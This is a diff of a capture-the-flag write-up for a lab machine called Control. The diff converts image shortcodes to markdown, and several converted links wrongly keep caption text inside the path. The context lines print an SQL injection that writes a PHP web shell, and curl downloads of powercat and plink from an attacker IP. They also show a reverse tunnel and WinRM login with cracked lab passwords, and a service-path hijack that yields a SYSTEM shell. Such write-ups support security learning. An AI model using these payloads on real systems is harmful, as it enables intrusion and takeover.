@@ -56,11 +56,11 @@ We see ```MySQL``` and ```MSRPC``` those are fun exploitable ports. Let's see wh
 
 We are greeted with a fun landing page. When we look at the source we see some comments.
 
-{{< figure src="__GHOST_URL__/content/images/2019/12/image-19.png" >}}
+![](/images/2019/12/image-19.png)
 
 This might be the host itself, or a docker instance or just junk. The admin page tells us to go through the proxy for access.
 
-{{< figure src="__GHOST_URL__/content/images/2019/12/image-20.png" >}}
+![](/images/2019/12/image-20.png)
 
 It seems that it's expecting a certain header parameter. We can use ```wfuzz``` to try and determine what it might be looking for. So we can create a list of all the HTTP header responses from [here](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers). So we have some header types to fuzz now we just need our target. We were given a hint earlier that we had some files stored on a ```192.168.4.28``` address. We can generate a list of every IP in that scope and use that. This is what our total command will look like:
 
@@ -76,7 +76,7 @@ A quick breakdown of the above command:
 ```"FUZZ:FUZ2Z"``` These are the two header parameters we are fuzzing. FUZZ is for the first wordlist specified. FUZ2Z is for the second word list specified. So we have something like this in the header of our request: "Acces-Control-Allow-Origin:192.168.4.44"
 ```"http://10.10.10.167/admin.php"``` Lastly, the target URL.
 
-{{< figure src="__GHOST_URL__/content/images/2019/12/long_wfuzz.gif" caption="Warning, this gif is 2:48 seconds long...." >}}
+![](/images/2019/12/long_wfuzz.gif" caption="Warning, this gif is 2:48 seconds long....)
 
 We see this works for us, we have a valid response to one of our header requests [```X-Forwarded-For```](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Forwarded-For) on IP ```192.168.4.28```. Now we can load up ```BurpSuite```, apply this header to our request and gain access to the admin page.
 
@@ -86,11 +86,11 @@ Proxy > Options > Match and Replace.
 
 We'll set the `Replace` field to be: `X-forwarded for: 192.168.4.28`
 
-{{< figure src="__GHOST_URL__/content/images/2019/12/burp-x.gif" >}}
+![](/images/2019/12/burp-x.gif)
 
 Now any requests we send to this domain will append our header parameter. We can then go to ```/admin.php``` and take a peek. We get a product search field
 
-{{< figure src="__GHOST_URL__/content/images/2019/12/image-21.png" >}}
+![](/images/2019/12/image-21.png)
 
 We can use ```SQLMap``` to see if anything is vulnerable here. Now we can use ```--Proxy=localhost:8080``` option to route it through ```BurpSuite``` to get our appended header to each request. I had some issues with that method, I'm not sure if it was because my connection was unstable, SQLMap was unstable or both. Another solution is to just take our request from Burp and put it in a file and give that file to ```SQLMap```.
 
@@ -136,20 +136,20 @@ database management system users password hashes:
 
 We can take these passwords and send them into `John`. Also `sqlmap` will take a pass at them as well.
 
-{{< figure src="__GHOST_URL__/content/images/2020/01/image-14.png" caption="manager password." >}}
+![](/images/2020/01/image-14.png" caption="manager password.)
 
-{{< figure src="__GHOST_URL__/content/images/2020/01/image-15.png" caption="hector password" >}}
+![](/images/2020/01/image-15.png" caption="hector password)
 
 We dont seem to be able to login with the credentials however. We know from our `sqlmap` run that `wwwroot` is writeable. We now need to upload a shell to this directory in order to potentially leverage these credentials internally. [This](https://offsec.vchur.dk/2019/02/24/sql-injection-rce-and-lfi/) is a quick resource. You could alternatly use `sqlmap` to [upload a file](https://www.hackingarticles.in/file-system-access-on-webserver-using-sqlmap/). In this case I used the former, slightly changed.
 
 Injection:
 `roductName=D-link+DWA-171'; select "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'C:\\Inetpub\\wwwroot\\oops.php';#`
 
-{{< figure src="__GHOST_URL__/content/images/2020/01/image-17.png" >}}
+![](/images/2020/01/image-17.png)
 
 Then we check the url and see if it's live.
 
-{{< figure src="__GHOST_URL__/content/images/2020/01/image-16.png" >}}
+![](/images/2020/01/image-16.png)
 
 Awesome, we have a basic shell. We need to now leverage this to create a more robust shell. [Powercat](https://github.com/besimorhino/powercat) is a good option here. In order to download it, first we need to host it on our machine with `SimpleHTTPServer`. Set up our `netcat` listener. Then we need to issue a fairly lengthy command to our basic shell to download powercat. Then invoke it.
 
@@ -161,32 +161,32 @@ Remote Download command ***WITH*** invoke:
 
 Once we do, we see our `HTTP Server` show activity then our `Netcat` listener activates:
 
-{{< figure src="__GHOST_URL__/content/images/2020/01/image-18.png" >}}
+![](/images/2020/01/image-18.png)
 
 We now have a shell and should look to start enumerating further. When we look at the network via `netstat` we see that `WinRM` is running locally (port 5985).
 
-{{< figure src="__GHOST_URL__/content/images/2020/01/image-19.png" >}}
+![](/images/2020/01/image-19.png)
 
 So how do we leverage this? Well, we can create a tunnel between this machine and ours using either `netcat.exe` or `plink.exe`. In this case we head over to `C:\Windows\System32\spool\drivers\color` and use `curl` with the `-o` option to download `plink.exe` hosted on our machine.
 
 Command:
 `curl http://10.10.14.126/plink.exe -o plink.exe`
 
-{{< figure src="__GHOST_URL__/content/images/2020/01/image-21.png" >}}
+![](/images/2020/01/image-21.png)
 
 Now we need to [create a tunnel](https://www.google.com/search?client=firefox-b-1-d&q=plink+tunnel) with it. It should be noted that you need to have `SSH` services running and not blocked for this to work.
 
 Command:
 `.\plink.exe -l rootflag -pw rootflag -R 5985:127.0.0.1:5985 10.10.14.126`
 
-{{< figure src="__GHOST_URL__/content/images/2020/01/control_reversetunnel.gif" >}}
+![](/images/2020/01/control_reversetunnel.gif)
 
 Once our tunnel is connected, we can connect to our local Kali machine with `Evil WinRM` to make a connection to the target.
 
 Command:
 `Evil-winrm -i 127.0.0.1 -u Hector -p 'l33th4x0rhector'`
 
-{{< figure src="__GHOST_URL__/content/images/2020/01/image-22.png" >}}
+![](/images/2020/01/image-22.png)
 
 Now that we are connected, we can get our `user.txt` file! We can now look to escalate. After trying numerous enumeration types, we finally see a hint when we get our registry ACL's.
 
@@ -204,7 +204,7 @@ Now we need to look at our `ImagePath` registry key.
 Command:
 `get-itemproperty HKLM:\System\CurrentControlSet\services\wuauserv`
 
-{{< figure src="__GHOST_URL__/content/images/2020/01/image-23.png" >}}
+![](/images/2020/01/image-23.png)
 
 We now need to modify this value to point to `netcat` so when it's called, it will do what we want.
 
@@ -218,7 +218,7 @@ Then we just start the service.
 Command:
 `start-service wuauserv`
 
-{{< figure src="__GHOST_URL__/content/images/2020/01/control_root.gif" >}}
+![](/images/2020/01/control_root.gif)
 
 Then we get our shell as System! 
 
